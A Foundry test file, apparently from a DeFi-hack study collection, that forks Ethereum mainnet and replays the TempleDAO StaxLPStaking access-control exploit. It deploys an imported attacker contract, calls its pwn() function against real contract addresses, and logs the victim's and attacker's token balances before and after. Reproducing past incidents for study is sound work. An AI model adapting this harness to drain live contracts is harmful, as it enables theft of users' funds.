// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "../src/AccessControl/TempleDao/TAttacker.sol";
import "../src/AccessControl/TempleDao/StaxLPStaking.sol";

contract TempleDAO is Test {
    TAttacker internal tAttacker;
    StaxLPStaking internal stakingContract;
    IERC20 lpToken;
    address attacker;
    address tokenLPaddress = 0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9;
    address stakingContractAddress = 0xd2869042E12a3506100af1D192b5b04D65137941;

    function setUp() public {
        vm.createSelectFork("mainnet", 15700000);
        stakingContract = StaxLPStaking(stakingContractAddress);
        vm.label(address(stakingContract), "victimContract");
        lpToken = IERC20(tokenLPaddress);

        attacker = makeAddr("attacker");
    }

    function testStakeContractState() public view {
        uint tokenBalance = lpToken.balanceOf(stakingContractAddress);
        console.log(
            "Token balance in stakingContract before the exploit : %s",
            tokenBalance
        );
        uint tokenBalanceAttacker = lpToken.balanceOf(attacker);
        console.log(
            "Token balance of attacker before the exploit : %s",
            tokenBalanceAttacker
        );
    }

    function testExploit() public {
        vm.startPrank(attacker);
        tAttacker = new TAttacker(tokenLPaddress, stakingContractAddress);
        vm.label(address(tAttacker), "AttackerContract");
        tAttacker.pwn();
        vm.stopPrank();
        uint tokenBalance = lpToken.balanceOf(stakingContractAddress);
        console.log(
            "Token balance in stakingContract after the exploit : %s",
            tokenBalance
        );
        uint tokenBalanceAttacker = lpToken.balanceOf(attacker);
        console.log(
            "Token balance of  attacker after the exploit : %s",
            tokenBalanceAttacker
        );
    }
}
